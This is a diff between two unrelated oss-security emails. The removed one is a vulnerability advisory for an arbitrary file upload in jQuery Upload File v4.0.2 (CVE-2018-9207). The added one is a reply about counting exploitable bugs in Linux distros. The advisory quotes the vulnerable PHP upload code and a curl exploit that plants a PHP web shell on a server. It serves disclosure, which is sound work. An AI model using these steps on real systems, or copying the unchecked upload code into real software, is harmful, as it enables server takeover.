@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["1741" "Tuesday" "20" "November" "2018" "17:07:09" "-0500" "Larry W. Cashdollar" "larry0@me.com" "<0677039D-F0D3-4CE6-98B1-7D688CBBC375@me.com>" "43" "[oss-security] Arbitrary file upload vulnerability in jQuery Upload File v4.0.2" nil nil nil "11" "2018112022:07:09" "[oss-security] Arbitrary file upload vulnerability in jQuery Upload File v4.0.2" (number mark "U       larry0@me.co Nov 20   43/1741  " thread-indent "\"[oss-security] Arbitrary file upload vulnerability in jQuery Upload File v4.0.2\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["2215" "Friday" "14" "July" "2017" "11:05:39" "-0400" "Santiago Torres" "torresariass@gmail.com" "<20170714150537.3e2irp53kwj5xsn7@LykOS.localdomain>" "59" "Re: [oss-security] Estimate for the total number of exploitable bugs in large linux distro?" "^Date:" nil nil "7" "2017071415:05:39" "[oss-security] Estimate for the total number of exploitable bugs in large linux distro?" (number mark "        torresariass Jul 14   59/2215  " thread-indent "\"Re: [oss-security] Estimate for the total number of exploitable bugs in large linux distro?\"\n") "<20170714093401.GB865@sivokote.iziade.m$>" ("<20170714093401.GB865@sivokote.iziade.m$>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0000
+X-Mozilla-Status: 0001
 X-Mozilla-Status2: 00000000
-Received: (qmail 20002 invoked by uid 550); 20 Nov 2018 22:07:27 -0000
+Received: (qmail 10105 invoked by uid 550); 14 Jul 2017 15:39:45 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,74 +11,103 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
+Received: (qmail 17796 invoked from network); 14 Jul 2017 15:05:53 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20161025;
+        h=date:from:to:subject:message-id:references:mime-version
+         :content-disposition:in-reply-to;
+        bh=sGhzKjyee80+IQKLO63Tm9SrqvwqyZ7A+Xk58giL2MI=;
+        b=O9AuOvWGJ1Cp+yrjF2mwFabRu1ldXTt8diAZgUBKtlPxdYZ1VAA285MPSOcj95eEEA
+         jmNrsvdrOTR6UQKHByUDKEa3dac7VJX2/8B74If8Pk6B+Eh//ixFNb7jH0MP7aauojhy
+         u1ApjRthgTbt5QLPXH6rFkmEtnp15vvR+fs9+DabxNKoRQ0LnFsDuA50LnRx/PELK+SI
+         0MJmI+fN1dLA/ZNl97dt7s8xtQVfM7LUO2COZ9QcFC6GGDA6PJchlg4qcPTOokxplzmi
+         9PQ96uca/WCZCrlryZ73EgEy2O2qt08RWT75YuiOLwVBFgb7aQ9N8o4byl8UGFqo8Y7s
+         /rdw==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20161025;
+        h=x-gm-message-state:date:from:to:subject:message-id:references
+         :mime-version:content-disposition:in-reply-to;
+        bh=sGhzKjyee80+IQKLO63Tm9SrqvwqyZ7A+Xk58giL2MI=;
+        b=opnIQnvl43hXT5ZHt7GVr6Ozcp7WE1Z1F8HdsHzBr6ssOXulLjnoeCOJ/YVFc1TO8q
+         RlnQ1Br2b13+s4laWTXIzrC27dvf2b8eyPVk1ep8g17k/0qaiD4DeHJ+rsQCnvFHG37v
+         dxqUt7OrkTZvp7cEs6z45het5atKltmmcJl863gf2c0Z6d5mPCaqQRdefMRpQjDpzD+o
+         2itkFMYQraEApeSzudKE1LJiKEz7O3bbEvMySsgrwz4hRTT/g5Sp3At7iGlkN6i0EjO5
+         KqLcjydoqk4iwr6NDzezWLXbo5lgGCUzIPDYu0mDH/C0Acf45dZysvlB2kWzD3pfwPYS
+         FnWA==
+X-Gm-Message-State: AIVw110Yaz7W17BWbgTnAu7o3gL9AfAmOj2tnX/Snjsl3pLvmXJYjQtM
+	edrh4kPk3RWo1Rb7
+X-Received: by 10.55.31.150 with SMTP id n22mr12434911qkh.46.1500044740760;
+        Fri, 14 Jul 2017 08:05:40 -0700 (PDT)
+Message-ID: <20170714150537.3e2irp53kwj5xsn7@LykOS.localdomain>
+References: <20170714093401.GB865@sivokote.iziade.m$>
+MIME-Version: 1.0
+Content-Type: multipart/signed; micalg=pgp-sha256;
+	protocol="application/pgp-signature"; boundary="eeu57hlz75t2ugyb"
+Content-Disposition: inline
+In-Reply-To: <20170714093401.GB865@sivokote.iziade.m$>
+Date: Fri, 14 Jul 2017 11:05:39 -0400
+From: Santiago Torres <torresariass@gmail.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 19958 invoked from network); 20 Nov 2018 22:07:27 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=me.com; s=04042017;
-	t=1542751635; bh=+DJXIv54KX/y/CgBzFZW+qxWsZHg4wEE9dUX51F4aEc=;
-	h=Date:Subject:From:To:Message-id:MIME-version:Content-type;
-	b=6iUha84QCpJPTljw5wCoIy3vbY6QSUW+9Bym+ynnGt0GDPA35ppCCLOvQogZDYspI
- aaW8/KgdYvF+2sL0HGlpDKNAm8V2HMJ7wZ0SzTCmwTUTps33HIYf6I4EUqF+MtBYfo
- HRJDmSf6PdvPNIY23qHfMTsM9gjTfbh7pTFkMtAZPXvwckw7wegaVEQx7uixJa/ZYU
- irA20ysONsOEsFXvW3jrPmBZJ5MQ/gpm0gVzb11uq3TCPPLeuMNtm/FIbkEHjDUJRb
- gxHXqypsL0YyR/kjmN5kw7Z+EWGuHeUp8NRxXs49ePDZBPZAAyVxg5xII6jyrYAty9
- FDuOh9jOYXFLA==
-X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 suspectscore=0
- malwarescore=0 phishscore=0 bulkscore=0 spamscore=0 clxscore=1015 mlxscore=0
- mlxlogscore=999 adultscore=0 classifier=spam adjust=0 reason=mlx scancount=1
- engine=8.0.1-1807170000 definitions=main-1811200194
-X-Proofpoint-Virus-Version: vendor=fsecure engine=2.50.10434:,,
- definitions=2018-11-20_10:,, signatures=0
-User-Agent: Microsoft-MacOutlook/10.13.0.181109
-Date: Tue, 20 Nov 2018 17:07:09 -0500
-From: "Larry W. Cashdollar" <larry0@me.com>
-To: Open Security <oss-security@lists.openwall.com>
-Message-id: <0677039D-F0D3-4CE6-98B1-7D688CBBC375@me.com>
-Thread-topic: Arbitrary file upload vulnerability in jQuery Upload File v4.0.2
-MIME-version: 1.0
-Content-type: text/plain; charset=UTF-8
-Content-transfer-encoding: quoted-printable
-Subject: [oss-security] Arbitrary file upload vulnerability in jQuery Upload File v4.0.2
+Subject: Re: [oss-security] Estimate for the total number of exploitable bugs
+ in large linux distro?
+To: oss-security@lists.openwall.com
 
-Title:=C2=A0Arbitrary file upload vulnerability in Hayageek jQuery Upload F=
-ile v4.0.2
-Author:=C2=A0Larry W. Cashdollar, @_larry0
-Date:=C2=A02018-11-02
-CVE-ID:[ CVE-2018-9207
-CWE:=C2=A0CWE-434 arbitrary file upload
-Download Site:=C2=A0http://hayageek.com/docs/jquery-upload-file.php
-Vendor:=C2=A0Hayageek
-Vendor Notified:=C2=A02018-11-02
-Vendor Contact:=C2=A0hayageek@gmail.com
-Advisory:=C2=A0http://www.vapidlabs.com/advisory.php?v=3D206
+--eeu57hlz75t2ugyb
+Content-Type: text/plain; charset=us-ascii
+Content-Disposition: inline
+Content-Transfer-Encoding: quoted-printable
 
-Description:=C2=A0jQuery Upload File plugin provides Multiple file Uploads =
-with progress bar.Works with any server-side platform (Google App Engine, P=
-HP, Python, Ruby on Rails, Java, etc.) that supports standard HTML form fil=
-e uploads.
+On Fri, Jul 14, 2017 at 12:34:01PM +0300, Georgi Guninski wrote:
+> What is an estimate for the total number of exploitable bugs in large
+> linux distro?
+>=20
 
-Vulnerability:
-The code in https://github.com/hayageek/jquery-upload-file/blob/master/php/=
-upload.php doesn't check for a file type or for requiring any authenticatio=
-n allowing a user to upload an executable file to the /uploads/ directory i=
-f it exists. if(!is_array($_FILES["myfile"]["name"])) //single file { $file=
-Name =3D $_FILES["myfile"]["name"]; move_uploaded_file($_FILES["myfile"]["t=
-mp_name"],$output_dir.$fileName); $ret[]=3D $fileName; } else //Multiple fi=
-les, file[] { $fileCount =3D count($_FILES["myfile"]["name"]); for($i=3D0; =
-$i < $fileCount; $i++) { $fileName =3D $_FILES["myfile"]["name"][$i]; move_=
-uploaded_file($_FILES["myfile"]["tmp_name"][$i],$output_dir.$fileName); $re=
-t[]=3D $fileName; }
+You may want to look at[1] for the case of ArchLinux. Do consider the
+caveat brought up by other people on the list: CVE numbers are not a 1:1
+mapping to bugs (or even exploitable bugs). For example, there are
+vendors that group all bugs discovered in a period (or with a conceputal
+similarity) under one CVE number, whereas others take mutliple
+variations of a bug and request an individual CVE for each. Needless to
+say, some bugs never get a CVE ;).
 
-Exploit Code:
-1. $ curl  -F  "myfile=3D@shell.php" "http://example.com/jquery-upload-file=
-/php/upload.php"
-2. ["shell.php"]
-3. =C2=A0
-4. Where shell is https://github.com/lcashdol/shittyshell/blob/master/shitt=
-yshell.php
-5. =C2=A0
-6. =C2=A0
-7. Shell is located http://example.com/jquery-upload-file/php/uploads/shell=
-.php
+> Also, does the total number decrease, increase or change in other way
+> over time?
 
+You could use the json api[2] on [1] to get a rolling count if you'd like
+to measure this (also pasted on [3]]):
 
+>>> import json, requests
+>>> response =3D requests.get("https://security.archlinux.org/vulnerable/js=
+on")
+>>> data =3D json.loads(response.content)
+>>> len(data)
+34
 
+Cheers!
+-Santiago.
+
+[1] https://security.archlinux.org/vulnerable
+[2] https://security.archlinux.org/vulnerable/json
+[3] https://bpaste.net/show/faa58aab9b1e=20
+
+--eeu57hlz75t2ugyb
+Content-Type: application/pgp-signature; name="signature.asc"
+
+-----BEGIN PGP SIGNATURE-----
+
+iQIzBAEBCAAdFiEEkDurc2QOttZVM+/zRo8SLOgWIpUFAllo3b8ACgkQRo8SLOgW
+IpWJPw//Y4hhEOfMCfUH8Ep/BGB0UFtMIu9vr1g8bAo5N0B6lby8nrTSZCEgwo9b
+eG8KcNmF6v5+ApfqgGhayDZMFW1vJMgeRPr8khAlCOT8NOoccWVFAkAIsTyJZVPt
+bAT0QUttdDOBda/aJcDDqazSE7X4A9AABUY/ytu00JFWCbkS5fFMBEMb8mj7lrc0
+/sBfe3jJ5qm9Wtg2crX33OQHLFy+zwWWaN2TVf91MI5XQxL+w/dirqGrpxqb+Xsa
+N1WVOGFoKuiqqG0iEDmHjUd4pv3SaRZb0mKikLVF7vX52psqF0wd7J8mJBXLdH1u
+MRxSzjrNe+2lquyR1ug7/XV058C5shMZqP40ZbsuGmjn++/kwcRJaV0hLdYos99i
+2t0+iBXesylrBNIIXwCOc1C+qg9QkGkZHPj18YKI2g7u6f8pZXYyYi3FBe+efDnf
+kkxg87/uuF13OSIWdkojhllvK+R5dORWb7/vXVoXULDR9gkR1wR7/b6qQ4vVtbct
+781T+Tbcs0O4ooTmyrZR432L2YQIQyO9KU9CD/yMuZ5rr1iZPbfIGjlws4VHUkkY
+lHonO3YrOPeZB0imVlorG5Jwi1qYZyh75iMo3XDubtA0bu7A0zyMN/wzbNQXiHhx
+BZyJ68M6Txk1bA/nfvE72HtImY9SxaIt4PwqmnYZQZqjSzCbSp8=
+=dXbq
+-----END PGP SIGNATURE-----
+
+--eeu57hlz75t2ugyb--
